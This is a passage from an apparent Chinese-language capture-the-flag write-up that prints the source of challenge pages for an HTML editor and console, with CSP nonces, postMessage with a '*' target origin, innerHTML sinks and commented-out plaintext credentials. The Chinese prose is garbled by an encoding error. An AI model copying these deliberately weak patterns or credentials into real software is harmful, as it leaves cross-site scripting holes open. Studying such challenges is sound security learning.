class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-content<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>       <span class=\"token comment\">// redirect all htmledit messages to the console</span><br>       <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">{</span><br>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>fromIframe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>             frames<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>cmd<span class=\"token operator\">:</span><span class=\"token string\">\"log\"</span><span class=\"token punctuation\">,</span>message<span class=\"token operator\">:</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>fromIframe<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>          <span class=\"token punctuation\">}</span><br>       <span class=\"token punctuation\">}</span><br>       <span class=\"token comment\">/*<br>       var DEV = true;<br>       var store = {<br>           users: {<br>             admin: {<br>                username: 'inti',<br>                password: 'griti'<br>             }, moderator: {<br>                username: 'root',<br>                password: 'toor'<br>             }, manager: {<br>                username: 'andrew',<br>                password: 'hunter2'<br>             },<br>          }<br>       }<br>       */</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>editor<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>bin<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>          <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">frames<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>cmd<span class=\"token operator\">:</span><span class=\"token string\">'clear'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>ğŸ—‘ï¸<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./console.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>codeFrame</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./htmledit.php?code=&lt;img src=x><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>textarea</span> <span class=\"token attr-name\">oninput</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>this.previousElementSibling.src=<span class=\"token punctuation\">'</span>./htmledit.php?code=<span class=\"token punctuation\">'</span>+escape(this.value)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>x</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>textarea</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é™¤äº†è¢«è¨»è§£çš„é‚£ä¸€æ®µè®Šæ•¸ä¹‹å¤–ï¼Œçœ‹èµ·ä¾†æ²’ä»€éº¼ç‰¹åˆ¥çš„ã€‚</p>\n<h3 id=\"htmledit.php\"><a class=\"direct-link\" href=\"#htmledit.php\">#</a> htmledit.php</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- &amp;lt;img src=x&amp;gt; --></span><br><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Native HTML editor<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>d8f00e6635e69bafbf1210ff32f96bdb<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        window<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>type<span class=\"token operator\">:</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                obj<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>                obj<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Exception called on </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>outerHTML<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            top<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>fromIframe<span class=\"token operator\">:</span>obj<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function-variable function\">onmessage</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">{</span><br>            top<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>fromIframe<span class=\"token operator\">:</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>x</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><br><span class=\"token comment\">&lt;!-- /* Page loaded in 0.000024 seconds */ --></span></code></pre>\n<p>é€™å€‹é é¢æœƒç›´æ¥æŠŠ query string code çš„å…§å®¹é¡¯ç¤ºåœ¨é é¢ä¸Šï¼Œç„¶å¾Œé–‹é ­é‚„æœ‰ä¸€æ®µç¥ç§˜çš„è¨»è§£ï¼Œæ˜¯æŠŠ code encode ä¹‹å¾Œçš„å…§å®¹ã€‚ä½†å„˜ç®¡é¡¯ç¤ºåœ¨é é¢ä¸Šå»æ²’è¾¦æ³•åŸ·è¡Œï¼Œå› ç‚ºæœ‰è‘—åš´æ ¼çš„ CSPï¼š<code>script-src 'nonce-...';frame-src https:;object-src 'none';base-uri 'none';</code></p>\n<p>ä¸é CSP è£¡é¢ç‰¹åˆ¥é–‹äº† frame-srcï¼Œæˆ‘çœ‹åˆ°é€™é‚Šçš„æ™‚å€™æƒ³èªªï¼šã€Œé€™å¯èƒ½æ˜¯å€‹æç¤ºï¼Œæç¤ºæˆ‘å€‘è¦ç”¨ iframeã€</p>\n<h3 id=\"console.php\"><a class=\"direct-link\" href=\"#console.php\">#</a> console.php</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        name <span class=\"token operator\">=</span> <span class=\"token string\">'Console'</span><br>        document<span class=\"token punctuation\">.</span>title <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">===</span> window<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hide code if not on iframe</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"><br>        <span class=\"token selector\">body, ul</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token selector\">ul#console</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> lightyellow<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">list-style-type</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Roboto Mono'</span><span class=\"token punctuation\">,</span> monospace<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token selector\">ul#console li</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> solid 1px #80808038<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">padding-left</span><span class=\"token punctuation\">:</span> 5px<span class=\"token punctuation\">;</span><br><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>console<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">anchor</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">s</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NFC'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">u</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">t</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">parse</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> e <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// make object look like string</span><br>        <span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>prefix<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> line <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"li\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> prefix_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> text_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'info'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightcyan'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'success'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightgreen'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'warn'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightyellow'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'err'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightpink'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span> <br>                <span class=\"token keyword\">default</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightcyan'</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>            <br>            data <span class=\"token operator\">=</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>safe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br><br>            prefix_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> prefix<span class=\"token punctuation\">;</span><br>            text_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span><br><br>            line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>prefix_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>text_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span> <br><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Connection status: '</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">.</span>navigator<span class=\"token punctuation\">.</span>onLine<span class=\"token operator\">?</span><span class=\"token string\">\"Online\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"Offline\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"log\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[log]: \"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"anchor\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[anchor]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token function\">u</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"clear\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[???]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Wrong command received: \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>cmd<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token 